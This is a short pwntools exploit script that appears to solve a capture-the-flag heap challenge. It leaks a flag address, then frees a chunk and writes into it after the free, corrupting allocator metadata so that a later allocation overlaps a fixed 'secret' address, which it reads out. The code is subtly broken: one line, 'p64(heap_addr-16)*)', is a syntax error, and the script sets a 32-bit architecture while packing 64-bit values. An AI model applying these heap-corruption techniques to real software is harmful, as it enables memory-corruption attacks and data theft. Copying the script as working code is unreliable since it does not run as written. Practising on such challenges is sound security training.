from pwn import *
context(os='linux', arch='i386', log_level='debug')
heap_addr=0x4140
secret_addr=0x4508
p=process("/challenge/toddlerheap_level6.0")

def malloc(idx,size):
    p.sendline("calloc "+str(idx)+" "+str(size))
def free(idx):
    p.sendline("free "+str(idx))
def puts(idx):
    p.sendline("puts "+str(idx))
def qt():
    p.sendline("quit")
def read(idx,payload):
    p.sendline("safer_read "+str(idx))
    p.send(payload)
def send_flag():
    p.sendline("send_flag")
p.recvuntil("Reading the flag into 0x",drop=True)
flag_addr=int(p.recvuntil(".\n",drop=True),16)
print("[LEAK]:flag_addr=",hex(flag_addr))
malloc(0,24)
malloc(1,24)
free(0)
read(0,b'a'*8+p64(heap_addr-16))
read(1,p64(heap_addr-16)*)
malloc(2,24)
malloc(2,24)
read(2,b'a'*16+p64(secret_addr))
puts(0)
print(p.recvall())
qt()
